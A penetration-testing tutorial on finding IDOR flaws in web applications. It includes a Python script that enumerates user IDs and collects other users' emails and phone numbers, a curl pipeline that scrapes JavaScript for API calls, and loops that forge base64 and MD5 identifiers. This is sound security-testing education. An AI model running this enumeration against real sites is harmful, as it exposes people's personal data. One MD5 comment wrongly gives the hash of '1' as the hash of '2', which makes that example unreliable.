# Identifying IDOR Vulnerabilities

IDOR identification is primarily an observation exercise. You are looking for any place where the application uses a user-controllable value to retrieve a specific server-side object, then testing whether the back-end validates ownership before returning that object.

***

## Location 1: URL Parameters and API Endpoints

The most visible IDOR surface is the URL itself. Any numeric ID, filename, or identifier in the query string or path is a candidate: 
```
# URL path parameters
/profile/1001
/invoice/5543
/admin/users/42

# Query string parameters
/download.php?file_id=123
/view.php?uid=1001
/api/orders?order_id=889

# POST body parameters (inspect with Burp, not visible in URL)
{"user_id": "1001", "action": "view_profile"}
{"invoice_id": "5543", "format": "pdf"}
```

For each identifier found, the test is straightforward: change the value by incrementing, decrementing, or substituting a known other user's ID, and observe whether the response returns data that should not be accessible.  A 200 response with another user's data is a confirmed IDOR. A 403 or a response containing only your own data indicates access control is present. 

**Automated enumeration with Python:**

```python
import requests

base_url = "https://target.com/api/user/"
headers = {"Authorization": "Bearer YOUR_SESSION_TOKEN"}
results = []

for user_id in range(1, 500):
    r = requests.get(base_url + str(user_id), headers=headers)
    if r.status_code == 200:
        data = r.json()
        if data.get("email") or data.get("phone"):
            results.append({"id": user_id, "data": data})
            print(f"[+] Found: User {user_id} → {data.get('email')}")
```

***

## Location 2: Hidden AJAX Calls in JavaScript

Front-end JavaScript frequently contains API calls that are never triggered in normal user flows but are fully functional on the back-end. Non-admin users may have the admin API calls sitting in their JavaScript bundle, simply never called by the UI. 

Search the page source and JavaScript files for: `ajax`, `fetch`, `XMLHttpRequest`, `$.post`, `$.get`, and API path patterns like `/api/admin/`, `/services/data/`, `/internal/`.

```javascript
// Found in front-end JavaScript:
function changeUserPassword() {
    $.ajax({
        url: "change_password.php",
        type: "post",
        data: {uid: user.uid, password: user.password, is_admin: is_admin},
        success: function(result) { }
    });
}

// This function may never be called for non-admin users
// but exists in the code and may be callable directly
```

Call these functions directly from the browser console, or replay the AJAX request manually in Burp with modified parameters. The `is_admin: 1` parameter in the above example is particularly telling: if the back-end trusts this client-supplied value without verifying the session, any user can call it with `is_admin: 1`.

**How to find them efficiently:**

```bash
# Download all JS files and grep for API patterns
curl -s https://target.com/ | grep -oP 'src="[^"]+\.js"' | \
  sed 's/src="//;s/"//' | xargs -I{} curl -s https://target.com/{} | \
  grep -oP '(url:|fetch\(|\.ajax\()[^,;)]+' | sort -u
```

***

## Location 3: Encoded and Hashed Object References

Applications that appear to use random or obfuscated identifiers often use predictable encoding rather than true randomness. The key is recognising the encoding scheme. 

**Base64 detection and bypass:**

```bash
# Recognise: long alphanumeric strings ending in = or ==
# Parameter: ?filename=ZmlsZV8xMjMucGRm

# Decode to reveal the real value
echo 'ZmlsZV8xMjMucGRm' | base64 -d
# file_123.pdf

# Modify and re-encode to access adjacent resources
echo -n 'file_124.pdf' | base64
# ZmlsZV8xMjQucGRm

# Test: ?filename=ZmlsZV8xMjQucGRm
```

**MD5 hash bypass:**

```bash
# Recognise: 32-character hex string
# Parameter: ?file=c81e728d9d4c2f636f067f89cc14862c

# Try hashing predictable values
echo -n '2' | md5sum        # c4ca4238a0b923820dcc509a6f75849b
echo -n 'file_1.pdf' | md5sum
echo -n '1' | md5sum        # c4ca4238a0b923820dcc509a6f75849b

# If the source code reveals the hashing method:
# CryptoJS.MD5('file_1.pdf') → hash file_2.pdf, file_3.pdf, etc.
```

**Combined encoding (base64 then MD5):** 

```bash
# Some applications layer encodings
# e.g.: base64(uid=1) → then md5 the result

echo -n '1' | base64 -w 0   # MQ==
echo -n 'MQ==' | md5sum     # if this matches the observed hash, pattern confirmed

# Then enumerate:
for i in {1..100}; do
    b64=$(echo -n "$i" | base64 -w 0)
    hash=$(echo -n "$b64" | md5sum | cut -d' ' -f1)
    echo "$i → $hash"
done
```

When you cannot immediately identify the encoding from the source code, feed the observed hash to [CrackStation](https://crackstation.net/) or use Burp Intruder with a number list as payload and compare hash outputs.

***

## Location 4: Comparing Two User Sessions

For applications using non-sequential or complex identifiers that cannot be guessed or decoded trivially, the dual-account technique reveals IDOR by testing cross-account access directly: 

```
Setup:
  Account A (User1): uid=1001, session token A
  Account B (User2): uid=1002, session token B

Step 1: Log in as User1, capture all API calls in Burp
  GET /api/profile/1001  with session token A → returns User1 data

Step 2: Log in as User2 in a different browser/profile
  Test: GET /api/profile/1001  with session token B
  → If server returns User1's data, IDOR confirmed

Step 3: Test modification endpoints cross-account
  POST /api/profile/update  with session token B, body: {uid: 1001, email: new@email.com}
  → If User1's email changes, write IDOR confirmed
```

Burp Suite's "Compare Site Maps" feature automates much of this: map the application with both accounts, then compare which endpoints each account can access. Discrepancies that should not exist indicate IDOR candidates.

***

## IDOR Identification Checklist

```
URL and POST body:
    Every numeric ID, filename, and identifier in URL paths and query strings
    POST body parameters containing user_id, file_id, order_id, etc.
    Hidden form fields (visible in page source, not rendered)
    Cookie values that reference user-specific objects

JavaScript and AJAX:
    All fetch() and $.ajax() calls in JS source files
    API endpoints referenced in JS that are never called in normal UI flow
    Parameters like is_admin, role, or user_type that are client-supplied

Encoded/hashed references:
    Strings matching base64 character set (A-Za-z0-9+/=)
    32-char hex strings (MD5), 40-char (SHA1), 64-char (SHA256)
    URL-encoded values that decode to IDs or filenames

Dual-account testing:
    Capture all API calls as User1
    Replay each call with User2's session token
    Test write operations cross-account (update, delete, modify)
    Test admin endpoints with non-admin session
```
